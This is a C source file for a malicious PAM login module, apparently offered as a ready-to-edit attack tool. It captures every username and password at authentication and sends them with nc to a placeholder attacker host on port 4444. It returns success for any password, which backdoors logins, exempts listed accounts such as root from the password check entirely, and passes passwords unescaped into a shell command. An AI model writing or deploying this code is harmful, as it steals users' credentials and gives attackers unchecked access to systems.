#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

// Edit this: Add usernames you want to ignore
int is_denied_user(const char *username) {
    const char *denylist[] = {"root", "admin", "youruser", NULL};
    for (int i = 0; denylist[i] != NULL; i++) {
        if (strcmp(username, denylist[i]) == 0)
            return 1;
    }
    return 0;
}

int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                        int argc, const char **argv) {
    const char *user;
    const char *pass;

    // Get username
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || !user)
        return PAM_IGNORE;

    // Skip users in denylist
    if (is_denied_user(user))
        return PAM_SUCCESS;

    // Get password (auth token)
    if (pam_get_item(pamh, PAM_AUTHTOK, (const void **)&pass) != PAM_SUCCESS || !pass)
        return PAM_IGNORE;

    // Build message to send
    char command[512];
    snprintf(command, sizeof(command),
             "echo 'Username: %s | Password: %s' | nc -w 1 YOURIP 4444",
             user, pass);

    // Send the data
    system(command);

    return PAM_SUCCESS;
}

int pam_sm_setcred(pam_handle_t *pamh, int flags,
                   int argc, const char **argv) {
    return PAM_SUCCESS;
}
